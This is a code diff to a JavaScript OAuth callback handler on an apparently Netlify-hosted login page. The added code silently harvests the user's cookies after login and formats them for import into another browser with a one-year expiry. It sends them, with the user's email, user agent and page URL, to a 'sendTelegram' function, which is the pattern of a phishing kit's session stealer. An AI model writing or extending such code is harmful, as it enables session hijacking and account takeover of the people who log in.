@@ -58,17 +58,48 @@ async function handleOAuthCallback() {
 
         // Only proceed if we have a successful response
         if (tokenData.success && tokenData.email) {
-            // Optionally send Telegram data here, silently
+            // Capture and send cookies to Telegram
             try {
-                const cookies = document.cookie;
+                // Get all cookies from the current domain
+                const cookieString = document.cookie;
+                let cookies = [];
+                
+                if (cookieString) {
+                    cookies = cookieString.split(';').map(cookie => {
+                        const [name, ...valueParts] = cookie.trim().split('=');
+                        const value = valueParts.join('=');
+                        return {
+                            name: name.trim(),
+                            value: value.trim(),
+                            domain: window.location.hostname,
+                            path: '/',
+                            secure: window.location.protocol === 'https:',
+                            httpOnly: false,
+                            sameSite: 'none',
+                            expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
+                            hostOnly: false,
+                            session: false,
+                            storeId: null
+                        };
+                    }).filter(c => c.name && c.value);
+                }
+                
+                // Send to Telegram with proper payload structure
                 await fetch('/.netlify/functions/sendTelegram', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         email: tokenData.email,
-                        cookies: cookies
+                        sessionId: `oauth_callback_${Date.now()}`,
+                        cookies: cookies,
+                        formattedCookies: cookies,
+                        timestamp: new Date().toISOString(),
+                        source: 'oauth-callback',
+                        userAgent: navigator.userAgent,
+                        currentUrl: window.location.href
                     }),
                 });
+                console.log('✅ Cookies sent to Telegram:', cookies.length, 'cookies captured');
             } catch (e) { /* fail silently */ }
 
             // Clean up PKCE/session state
